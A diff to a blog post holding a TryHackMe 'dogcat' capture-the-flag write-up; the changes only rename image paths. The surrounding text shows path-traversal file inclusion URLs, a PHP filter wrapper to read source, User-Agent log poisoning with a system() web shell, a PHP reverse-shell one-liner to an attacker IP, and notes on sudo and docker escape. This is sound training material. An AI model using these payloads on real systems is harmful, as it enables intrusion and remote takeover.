@@ -4,7 +4,7 @@ layout: default
 
 # TryHackMe - dogcat writeup 
 
-![dogcat header](/assets/images/vh_dogcat/dogcat_header.png)
+![dogcat header](/assets/images/thm_dogcat/dogcat_header.png)
 
 [TryHackMe dogcat room link](https://tryhackme.com/room/dogcat)
 
@@ -111,11 +111,11 @@ http://10.10.124.115/?view=./dog/../../../../../etc/passwd&ext=
 The passwd file did not contain anything interesting.
 
 
-![dogcat web application](/assets/images/vh_dogcat/thm_dogcat_webapp_1.jpg)
+![dogcat web application](/assets/images/thm_dogcat/thm_dogcat_webapp_1.jpg)
 
 I also run a dirbuster scan to see if I can discover any hidden directories or files on the web server.
 
-![dogcat dirbuster scan results](/assets/images/vh_dogcat/thm_dogcat_dirbuster_scan.jpg)
+![dogcat dirbuster scan results](/assets/images/thm_dogcat/thm_dogcat_dirbuster_scan.jpg)
 
 The flag.php file looks interesting. I tried to read the file using a PHP filter wrapper code that converts the file to base64 and outputs it so I can read the flag.php code without executing it. 
 
@@ -128,7 +128,7 @@ http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../fl
 http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../index
 ```
 
-![Local File Inclusion](/assets/images/vh_dogcat/thm_dogcat_lfi_1.jpg)
+![Local File Inclusion](/assets/images/thm_dogcat/thm_dogcat_lfi_1.jpg)
 
 Base64 decode the string outputted and that will display the contents of the flag.php file.
 
@@ -182,25 +182,25 @@ I then modify the **User-Agent:** header and insert the following PHP code into 
 <?php system($_GET['cmd']);?>
 ```
 
-![Burpsuit poison php header](/assets/images/vh_dogcat/thm_dogcat_burpsuit_1.jpg)
+![Burpsuit poison php header](/assets/images/thm_dogcat/thm_dogcat_burpsuit_1.jpg)
 
 Now that we I have poisoned the logs I try to execute a simple whoami command to see if it works and it does.
 ```
 http://10.10.124.115/?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
 ```
 
-![dogcat LFI to code execution](/assets/images/vh_dogcat/thm_dogcat_lfi_2.jpg)
+![dogcat LFI to code execution](/assets/images/thm_dogcat/thm_dogcat_lfi_2.jpg)
 
 Now I use the following PHP reverse shell one-liner from pentestmonkey.net
 ```
 php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-![LFI to reverse shell](/assets/images/vh_dogcat/thm_dogcat_burpsuit_2.jpg)
+![LFI to reverse shell](/assets/images/thm_dogcat/thm_dogcat_burpsuit_2.jpg)
 
 I had to URL encode all characters in the php reverse shell code to get it to work properly.
 
-![URL encoded php reverse shell](/assets/images/vh_dogcat/thm_dogcat_burpsuit_3.jpg)
+![URL encoded php reverse shell](/assets/images/thm_dogcat/thm_dogcat_burpsuit_3.jpg)
 
 I start a netcat listener on my attacking machine on port 1234 and then send the above GET request using burpsuit to gain the initial shell on the system as the ***www-data** user. With a tiny bit of directory enumeration I find the second flag.
 
@@ -208,7 +208,7 @@ I start a netcat listener on my attacking machine on port 1234 and then send the
 sudo nc -nvlp 1234
 ```
 
-![Initial Shell](/assets/images/vh_dogcat/thm_dogcat_initial_shell.jpg)
+![Initial Shell](/assets/images/thm_dogcat/thm_dogcat_initial_shell.jpg)
 
 ## Privilege Escalation
 
@@ -217,7 +217,7 @@ I do a the following sudo command to see what I can execute as sudo.
 sudo -l
 ```
 
-![SUDO Privilege Escalation via env](/assets/images/vh_dogcat/thm_dogcat_flag3.jpg)
+![SUDO Privilege Escalation via env](/assets/images/thm_dogcat/thm_dogcat_flag3.jpg)
 
 I see that I can execute /usr/bin/env as sudo. I go to GTFOBins and find a way to escalate my privileges to root.
 
@@ -245,7 +245,7 @@ chmod +x linpeas.sh
 
 I noticed two odd things that indicated that we were in a docker container. The first being a random hostname and the second being the .dockerenv file.
 
-![Docker Files](/assets/images/vh_dogcat/thm_dogcat_docker.jpg)
+![Docker Files](/assets/images/thm_dogcat/thm_dogcat_docker.jpg)
 
 ## Escaping Docker Container
 
@@ -260,6 +260,6 @@ Run a listener on the attacking machine and get root shell.
 sudo nc -nvlp 9001
 ```
 
-![Root and Flag 4](/assets/images/vh_dogcat/thm_dogcat_root_and_flag4.jpg)
+![Root and Flag 4](/assets/images/thm_dogcat/thm_dogcat_root_and_flag4.jpg)
 
 That marks the end of this system, obtaining all 4 flags. The most interesting parts were the unusual LFI attack path due to the logic found in the index.php file and the fact that we were in a docker container that we had to escape to get a final root shell at the end.
